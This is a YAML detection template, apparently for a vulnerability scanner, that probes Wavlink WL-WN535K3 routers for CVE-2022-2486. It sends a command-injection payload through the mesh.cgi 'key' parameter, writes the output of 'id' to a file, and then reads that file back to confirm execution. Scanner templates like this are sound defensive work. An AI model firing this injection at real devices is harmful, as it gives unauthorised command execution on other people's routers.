name: yaml-poc-wavlink-wl-wn535k3_firmware-unauthorized_access-CVE-2022-2486
binding: 0b750d8a-480a-4b91-a2a9-73708a3f6fcb
detail:
    author: system_user
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-2486/
        - https://github.com/1angx/webray.com.cn/blob/main/Wavlink/Wavlink%20mesh.cgi.md
        - https://vuldb.com/?id.204537
    vulnerability:
        id: e06ab2a7-3337-4399-a91e-bd82ea86ab10
        level: critical
transport: http
set:
    filename: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi-bin/mesh.cgi?page=upgrade&key=%27;id>./{{filename}}.txt;%27
        expression: response.status == 500
    r1:
        request:
            cache: true
            method: GET
            path: /cgi-bin/{{filename}}.txt
        expression: response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=")
expression: r0() && r1()
